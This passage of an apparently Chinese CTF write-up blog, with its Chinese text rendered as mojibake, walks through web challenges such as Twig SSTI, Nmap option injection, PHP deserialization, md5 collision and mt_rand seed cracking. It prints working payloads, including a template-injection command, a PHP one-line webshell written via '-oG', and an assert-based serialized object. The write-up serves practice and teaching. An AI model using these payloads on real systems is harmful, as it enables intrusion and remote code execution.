alt="image-20231216144446052"></p><p>idè¾“å…¥ä»€ä¹ˆå°±ä¼šæ˜¾ç¤ºä»€ä¹ˆ</p><p><img src="/../images/image-20231216144507177.png" alt="image-20231216144507177"></p><p>æŠ“åŒ…çœ‹ä¸€ä¸‹</p><p><img src="/../images/image-20231216144554296.png" alt="image-20231216144554296"></p><p>å°è¯•ä¸€ä¸‹æœ‰æ²¡æœ‰å¯èƒ½æ˜¯SSTI</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;1+1&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231216144813734.png" alt="image-20231216144813734"></p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231216150315186.png" alt="image-20231216150315186"></p><h1 id="ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap"><a href="#ç½‘é¼æ¯-2020-æœ±é›€ç»„-Nmap" class="headerlink" title="[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap"></a>[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap</h1><p>æ‰“å¼€ç¯å¢ƒ</p><p><img src="/../images/image-20231217101352330.png" alt="image-20231217101352330"></p><p>æ˜¯ä¸€ä¸ªåœ¨çº¿çš„nampç½‘ç«™</p><p>å°è¯•å†™å…¥ä¸€å¥è¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt; -oG 1.php&#x27;</span><br></pre></td></tr></table></figure><p>è¢«è¿‡æ»¤</p><p><img src="/../images/image-20231217101549048.png" alt="image-20231217101549048"></p><p>phtml</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;?php @eval($_POST[&quot;key&quot;]);?&gt; -oG 1.phtml&#x27;</span><br></pre></td></tr></table></figure><p>è¿˜æ˜¯è¢«è¿‡æ»¤</p><p><img src="/../images/image-20231217101638457.png" alt="image-20231217101638457"></p><p>çŸ­æ ‡ç­¾</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;? echo @eval($_POST[&quot;key&quot;]);?&gt; -oG 1.phtml&#x27;</span><br></pre></td></tr></table></figure><p>æˆåŠŸ</p><p><img src="/../images/image-20231217101751551.png" alt="image-20231217101751551"></p><p><img src="/../images/image-20231217101924320.png" alt="image-20231217101924320"></p><h1 id="NPUCTF2020-ReadlezPHP"><a href="#NPUCTF2020-ReadlezPHP" class="headerlink" title="[NPUCTF2020]ReadlezPHP"></a>[NPUCTF2020]ReadlezPHP</h1><p>æ‰“å¼€ç¯å¢ƒ</p><p><img src="/../images/image-20231217104203705.png" alt="image-20231217104203705"></p><p>F12æŸ¥çœ‹ä¸€ä¸‹</p><p><img src="/../images/image-20231217104243867.png" alt="image-20231217104243867"></p><p>è®¿é—®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;Y-m-d h:i:s&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="string">&quot;date&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$a</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="variable">$b</span> = <span class="variable language_">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$b</span>(<span class="variable">$a</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title class_">HelloPhp</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@<span class="variable">$ppp</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&quot;data&quot;</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ„é€ åºåˆ—åŒ–ï¼Œåˆ©ç”¨å‘½ä»¤æ‰§è¡Œå³å¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>=<span class="string">&quot;phpinfo()&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>=<span class="string">&quot;assert&quot;</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">HelloPhp</span>);</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?data=O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:9:&quot;phpinfo()&quot;;s:1:&quot;b&quot;;s:6:&quot;assert&quot;;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20231217104538747.png" alt="image-20231217104538747"></p><h1 id="å®‰æ´µæ¯-2019-easy-web"><a href="#å®‰æ´µæ¯-2019-easy-web" class="headerlink" title="[å®‰æ´µæ¯ 2019]easy_web"></a>[å®‰æ´µæ¯ 2019]easy_web</h1><p>æ‰“å¼€ç¯å¢ƒ</p><p><img src="/../images/image-20231219204126482.png" alt="image-20231219204126482"></p><p>è§£ç </p><p>ä¸¤æ¬¡base64+hex</p><p><img src="/../images/image-20231219204354996.png" alt="image-20231219204354996"></p><p>å°è¯•å¯¹index.phpè¿›è¡Œç›¸åŒç¼–ç </p><p><img src="/../images/image-20231219204524717.png" alt="image-20231219204524717"></p>  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br></pre></td></tr></table></figure><p>è§£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(E_ALL || ~ E_NOTICE);</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;content-type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>])) </span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&#x27;Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd=&#x27;</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img&#x27;</span>])));</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.]+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/i&quot;</span>, <span class="variable">$file</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src =&quot;./ctf3.jpeg&quot;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;xixiï½ no flag&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$txt</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$file</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;img src=&#x27;data:image/gif;base64,&quot;</span> . <span class="variable">$txt</span> . <span class="string">&quot;&#x27;&gt;&lt;/img&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cmd</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#x27;|\&quot;|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i&quot;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">&quot;forbid ~&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>] !== (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>] &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;b&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `<span class="variable">$cmd</span>`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">&quot;md5 is funny ~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:<span class="title function_ invoke__">url</span>(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰æ­£åˆ™è¿‡æ»¤ï¼Œå¹¶ä¸”éœ€è¦å¼ºç¢°æ’</p><p>ç›´æ¥burp:</p><p><img src="/../images/image-20231219203949964.png" alt="image-20231219203949964"></p><h1 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h1><p>è®¿é—®ç¯å¢ƒ</p><p><img src="/../images/image-20240115083520327.png" alt="image-20240115083520327"></p><p>è¿™é‡Œè¯´æ˜¯è¦çŒœå·ï¼ŒæŸ¥çœ‹æºç ï¼Œå‘ç°check.php</p><p><img src="/../images/image-20240114231341961.png" alt="image-20240114231341961"></p><p>è®¿é—®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>); </span><br></pre></td></tr></table></figure><p>ä¼ªéšæœºæ•°ç§å­</p><p>æ ¹æ®ç°æœ‰çš„å­—ç¬¦ä¸²æˆ‘ä»¬å…ˆæ¥æ‰¾å‡ºç§å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;5WyZDu7Byj&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=<span class="built_in">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(str1)-<span class="number">1</span>)+<span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240115083456214.png" alt="image-20240115083456214"></p><p>ç„¶åä½¿ç”¨php_mt_seedçˆ†ç ´å¾—åˆ°ç§å­</p><p><img src="/../images/image-20240115083620230.png" alt="image-20240115083620230"></p><p>æ ¹æ®è¿™ä¸ªç§å­å¾—åˆ°å®Œæ•´çš„å­—ç¬¦ä¸²(æ³¨æ„phpç‰ˆæœ¬åœ¨7.1.0ä»¥ä¸Š)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">395019830</span>); </span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span> = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$str</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240115083739161.png" alt="image-20240115083739161"></p><p>å¾—åˆ°flag</p><p><img src="/../images/image-20240115083354099.png" alt="image-20240115083354099"></p><h1 id="MRCTF2020-å¥—å¨ƒ"><a href="#MRCTF2020-å¥—å¨ƒ" class="headerlink" title="[MRCTF2020]å¥—å¨ƒ"></a>[MRCTF2020]å¥—å¨ƒ</h1><p>æ‰“å¼€ç¯å¢ƒï¼ŒF12æŸ¥çœ‹</p><p><img src="/../images/image-20240115091923207.png" alt="image-20240115091923207"></p><p>ä»£ç å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä»£ç å®¡è®¡ï¼š</p><p>$_SERVER[â€˜QUERY_STRINGâ€™]è·å–çš„æ˜¯?åé¢çš„å€¼ï¼Œå¹¶ä¸”ä¸èƒ½æœ‰ä¸‹åˆ’çº¿å’Œâ€%5fâ€ï¼Œå¯ä»¥ä½¿ç”¨â€.â€æˆ–â€%5ç»•è¿‡â€</p><p>GETä¼ å‚b_u_p_tä¸èƒ½æœ‰23333ä½†æ˜¯æ­£åˆ™éœ€è¦åŒ¹é…åˆ°23333ï¼Œå¯ä»¥ä½¿ç”¨%0aç»•è¿‡(æ­£åˆ™åªåŒ¹é…å¼€å¤´å’Œç»“å°¾)</p><p>æ„é€ </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?b.u.p.t=23333%0A</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240115092606793.png" alt="image-20240115092606793"></p><p>æç¤ºflagåœ¨secrettw.php </p><p>è®¿é—®secrettw.php</p><p><img src="/../images/image-20240115092652187.png" alt="image-20240115092652187"></p><p>æç¤ºåªæœ‰æœ¬åœ°æ‰èƒ½æŸ¥çœ‹ï¼ŒF12çœ‹ä¸‹</p><p><img src="/../images/image-20240115092741692.png" alt="image-20240115092741692"></p><p>JSFUCKï¼Œç›´æ¥åœ¨æ§åˆ¶å°è¿è¡Œ</p><p><img src="/../images/image-20240115092809678.png" alt="image-20240115092809678"></p><p>æç¤ºpostä¼ å‚Merakï¼Œä¼ ä¸€ä¸‹ï¼Œå¾—åˆ°æºç </p><p><img src="/../images/image-20240115092850442.png" alt="image-20240115092850442"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;takeip.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;.&#x27;</span>); </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Merak&#x27;</span>]))&#123; </span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line">    <span class="keyword">die</span>(); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">change</span>(<span class="params"><span class="variable">$v</span></span>)</span>&#123; </span><br><span class="line">    <span class="variable">$v</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$v</span>); </span><br><span class="line">    <span class="variable">$re</span> = <span class="string">&#x27;&#x27;</span>; </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$i</span>++)&#123; </span><br><span class="line">        <span class="variable">$re</span> .= <span class="title function_ invoke__">chr</span> ( <span class="title function_ invoke__">ord</span> (<span class="variable">$v</span>[<span class="variable">$i</span>]) + <span class="variable">$i</span>*<span class="number">2</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$re</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Local access only!&#x27;</span>.<span class="string">&quot;&lt;br/&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">getIp</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!=<span class="string">&#x27;127.0.0.1&#x27;</span>)</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Sorry,you don&#x27;t have permission!  Your ip is :&quot;</span>.<span class="variable">$ip</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span> === <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;2333&#x27;</span>]) === <span class="string">&#x27;todat is a happy day&#x27;</span> )&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Your REQUEST is:&quot;</span>.<span class="title function_ invoke__">change</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">change</span>(<span 